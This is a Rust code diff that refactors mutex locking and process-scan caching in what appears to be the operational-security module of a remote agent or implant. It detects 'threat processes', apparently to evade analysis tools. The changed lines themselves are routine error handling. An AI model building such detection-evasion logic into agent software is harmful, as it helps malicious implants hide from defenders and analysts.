@@ -154,7 +154,18 @@ fn timestamp_elapsed_secs(timestamp: u64) -> u64 {
 pub fn with_opsec_state<F, R>(accessor: F) -> R 
 where F: Fn(&OpsecState) -> R,
 {
-    let protector = MEMORY_PROTECTOR.lock().unwrap();
+    // Use safe mutex lock that recovers from poison
+    let protector = match crate::safe_mutex::safe_lock(&MEMORY_PROTECTOR) {
+        Ok(guard) => guard,
+        Err(e) => {
+            error!("[OPSEC] Failed to lock MEMORY_PROTECTOR: {}", e);
+            // Return default state on lock failure
+            let config = crate::config::AgentConfig::load().unwrap_or_default();
+            let default_state = create_default_opsec_state(&config);
+            return accessor(&default_state);
+        }
+    };
+    
     match protector.with_opsec_state(&accessor) {
         Ok(result) => result,
         Err(_) => {
@@ -169,7 +180,18 @@ where F: Fn(&OpsecState) -> R,
 pub fn with_opsec_state_mut<F, R>(updater: F) -> R 
 where F: Fn(&mut OpsecState) -> R,
 {
-    let mut protector = MEMORY_PROTECTOR.lock().unwrap();
+    // Use safe mutex lock that recovers from poison
+    let mut protector = match crate::safe_mutex::safe_lock(&MEMORY_PROTECTOR) {
+        Ok(guard) => guard,
+        Err(e) => {
+            error!("[OPSEC] Failed to lock MEMORY_PROTECTOR: {}", e);
+            // Return default result on lock failure
+            let config = crate::config::AgentConfig::load().unwrap_or_default();
+            let mut default_state = create_default_opsec_state(&config);
+            return updater(&mut default_state);
+        }
+    };
+    
     match protector.with_opsec_state_mut(&updater) {
         Ok(result) => result,
         Err(_) => {
@@ -447,7 +469,16 @@ static PROC_SCAN_CACHE: Lazy<Mutex<(u64, bool)>> = Lazy::new(|| Mutex::new((0, f
 
 #[cfg(target_os = "windows")]
 pub fn check_proc_state(proc_scan_interval: u64) -> bool {
-    let mut cache = PROC_SCAN_CACHE.lock().unwrap();
+    // Use safe mutex lock that recovers from poison
+    let mut cache = match crate::safe_mutex::safe_lock(&PROC_SCAN_CACHE) {
+        Ok(guard) => guard,
+        Err(e) => {
+            error!("[OPSEC] Failed to lock PROC_SCAN_CACHE: {}, performing fresh scan", e);
+            // On lock failure, perform scan anyway
+            return perform_process_scan();
+        }
+    };
+    
     let (last_scan, last_result) = *cache;
     
     let now = now_timestamp();
@@ -457,6 +488,15 @@ pub fn check_proc_state(proc_scan_interval: u64) -> bool {
     }
 
     debug!("[OPSEC] Performing fresh process scan...");
+    let threat_detected = perform_process_scan();
+    
+    *cache = (now, threat_detected);
+    threat_detected
+}
+
+// Extract the actual scanning logic to avoid duplication
+#[cfg(target_os = "windows")]
+fn perform_process_scan() -> bool {
     let mut threat_detected = false;
     let mut threat_count = 0;
     
@@ -505,13 +545,21 @@ pub fn check_proc_state(proc_scan_interval: u64) -> bool {
         debug!("[OPSEC] Process scan complete: No threat processes detected");
     }
     
-    *cache = (now, threat_detected);
     threat_detected
 }
 
 #[cfg(not(target_os = "windows"))]
 pub fn check_proc_state(proc_scan_interval: u64) -> bool {
-    let mut cache = PROC_SCAN_CACHE.lock().unwrap();
+    // Use safe mutex lock that recovers from poison
+    let mut cache = match crate::safe_mutex::safe_lock(&PROC_SCAN_CACHE) {
+        Ok(guard) => guard,
+        Err(e) => {
+            error!("[OPSEC] Failed to lock PROC_SCAN_CACHE: {}, performing fresh scan", e);
+            // On lock failure, perform scan anyway
+            return perform_process_scan_linux();
+        }
+    };
+    
     let (last_scan, last_result) = *cache;
     
     let now = now_timestamp();
@@ -521,6 +569,15 @@ pub fn check_proc_state(proc_scan_interval: u64) -> bool {
     }
 
     debug!("[OPSEC] Performing fresh process scan (Linux)...");
+    let threat_detected = perform_process_scan_linux();
+    
+    *cache = (now, threat_detected);
+    threat_detected
+}
+
+// Extract the actual scanning logic for Linux
+#[cfg(not(target_os = "windows"))]
+fn perform_process_scan_linux() -> bool {
     let mut threat_detected = false;
     
     // Get running processes using sysinfo
@@ -565,7 +622,6 @@ pub fn check_proc_state(proc_scan_interval: u64) -> bool {
         debug!("[OPSEC] Process scan complete: No threat processes detected");
     }
     
-    *cache = (now, threat_detected);
     threat_detected
 }
 
